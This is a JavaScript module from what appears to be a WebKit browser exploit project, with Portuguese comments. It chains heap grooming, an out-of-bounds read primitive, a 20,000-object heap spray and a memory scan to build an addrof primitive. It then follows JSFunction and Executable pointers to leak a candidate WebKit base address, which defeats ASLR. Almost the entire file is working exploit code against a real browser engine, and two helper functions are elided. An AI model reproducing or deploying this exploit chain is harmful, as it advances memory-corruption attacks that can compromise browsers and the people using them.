// js/script3/testArrayBufferVictimCrash.mjs (R51 - Addrof via Heap Grooming + OOB Scan)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Exploit_R51_HeapGroomingAddrof";

// Parâmetros do Heap Grooming
const GROOM_ARRAY_SIZE = 512;
const GROOM_BUFFER_SIZE = OOB_CONFIG.ALLOCATION_SIZE; // Usar o mesmo tamanho da alocação OOB

// Parâmetros do Spray e Scan
const SPRAY_SIZE = 20000;
const SPRAY_MARKER_BIGINT = 0x47524F4F4D4A5321n; // "GROOMJS!" em ASCII
const HEAP_SCAN_RANGE_BYTES = 0x800000; // 8MB
const HEAP_SCAN_STEP = 0x8;
const OOB_SCAN_WINDOW_BYTES = 0x200000; // 2MB
const OOB_SCAN_STEP = 0x4;

// Offsets para WebKit Leak
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R51() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Heap Grooming & OOB Scan ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init HeapGroom...`;

    logS3(`--- Fase 0 (HeapGroom): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (HeapGroom): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (HeapGroom): Não iniciado.", webkit_base_candidate: null },
    };

    try {
        // --- Fase 1: Heap Grooming ---
        logS3(`--- Fase 1 (HeapGroom): Modelando o Heap ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        logS3(`   Alocando ${GROOM_ARRAY_SIZE} buffers de ${GROOM_BUFFER_SIZE / 1024} KB para modelagem...`, "info");
        const groom_array = new Array(GROOM_ARRAY_SIZE);
        for (let i = 0; i < GROOM_ARRAY_SIZE; i++) {
            groom_array[i] = new ArrayBuffer(GROOM_BUFFER_SIZE);
        }
        logS3(`   Criando "buracos" no heap...`, "info");
        for (let i = 1; i < GROOM_ARRAY_SIZE; i += 2) { // Liberar buffers de índice ímpar
            groom_array[i] = null;
        }
        // Uma pequena pausa ou mais alocações podem ajudar o GC a coletar os buffers liberados
        await PAUSE_S3(50);
        logS3(`   Heap modelado.`, "good");

        // --- Fase 2: Ativar OOB e procurar ponteiro inicial ---
        logS3(`--- Fase 2 (HeapGroom): Ativando OOB e procurando ponteiro inicial ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        if (!isOOBReady() || typeof arb_read !== 'function') {
            throw new Error("Falha ao preparar ambiente OOB ou a primitiva arb_read não está disponível.");
        }

        let initial_heap_ptr = null;
        logS3(`   Varrendo a janela OOB em busca de um ponteiro para um buffer adjacente...`, 'info');
        for (let offset = 0; offset < OOB_SCAN_WINDOW_BYTES; offset += OOB_SCAN_STEP) {
            try {
                const potential_ptr = await arb_read(new AdvancedInt64(0, offset), 8); 
                if (isValidPointer(potential_ptr, "_oobScan")) {
                    initial_heap_ptr = potential_ptr;
                    break;
                }
            } catch (e) { /* Ignorar erros */ }
        }

        if (!initial_heap_ptr) {
            throw new Error("Nenhum ponteiro de heap válido encontrado na janela OOB mesmo após o grooming.");
        }
        logS3(`   Ponteiro de heap inicial encontrado: ${initial_heap_ptr.toString(true)}`, "good");

        // --- Fase 3: Construir ADDROF via Heap Spray & Scan ---
        logS3(`--- Fase 3 (HeapGroom): Construindo ADDROF via Heap Spray & Scan ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        const target_function_for_addrof = function someUniqueLeakFunctionR51_SprayTarget() {};
        
        logS3(`   Pulverizando a memória com ${SPRAY_SIZE} objetos marcadores...`, "info");
        const spray_array = new Array(SPRAY_SIZE);
        for (let i = 0; i < SPRAY_SIZE; i++) {
            spray_array[i] = { marker: SPRAY_MARKER_BIGINT, target: target_function_for_addrof };
        }
        logS3(`   Spray concluído.`, "good");

        logS3(`   Iniciando varredura com arb_read em torno de ${initial_heap_ptr.toString(true)}...`, "info");
        let found_marker_at = null;
        for (let offset = -HEAP_SCAN_RANGE_BYTES; offset <= HEAP_SCAN_RANGE_BYTES; offset += HEAP_SCAN_STEP) {
            const current_scan_addr = initial_heap_ptr.add(new AdvancedInt64(offset));
            try {
                const val64 = await arb_read(current_scan_addr, 8);
                if (val64 && val64.toBigInt() === SPRAY_MARKER_BIGINT) {
                    found_marker_at = current_scan_addr;
                    logS3(`   !!! MARCADOR ENCONTRADO EM ${found_marker_at.toString(true)} !!!`, "success_major");
                    break;
                }
            } catch (e) { /* ignorar erros */ }
        }

        if (!found_marker_at) {
            throw new Error("Marcador do spray não encontrado na memória.");
        }
        
        const target_object_pointer_addr = found_marker_at.add(new AdvancedInt64(8));
        const leaked_target_addr = await arb_read(target_object_pointer_addr, 8);
        if (!isValidPointer(leaked_target_addr, "_leakedFinalAddr")) {
            throw new Error(`Ponteiro lido para o objeto alvo é inválido: ${safeToHex(leaked_target_addr)}`);
        }

        logS3(`   !!! ADDROF(target_function_for_addrof) = ${leaked_target_addr.toString(true)} !!!`, "success_major");
        result.addrof_result = { success: true, msg: "addrof obtido via Heap Grooming, OOB Scan e Heap Spray.", leaked_object_addr: leaked_target_addr.toString(true) };
        
        // --- Fase 4: Usar ADDROF para vazar a base do WebKit ---
        logS3(`--- Fase 4 (HeapGroom): Usando addrof para vazar o endereço base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        const addr_of_target_func = leaked_target_addr;
        const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
        if (!isValidPointer(ptr_exe, "_wkLeakExeSpray")) throw new Error("Ponteiro para Executable inválido.");
        logS3(`   Ponteiro para Executable Instance = ${ptr_exe.toString(true)}`, "leak_detail");

        const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmSpray")) throw new Error("Ponteiro para JIT Code/VM inválido.");
        logS3(`   Ponteiro para JIT Code/VM = ${ptr_jitvm.toString(true)}`, "leak_detail");

        const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
        logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");

        result.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;

    } catch(e) {
        logS3(`   ERRO na execução do exploit: ${e.message}`, "critical");
        result.errorOccurred = e.message;
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    return result;
}
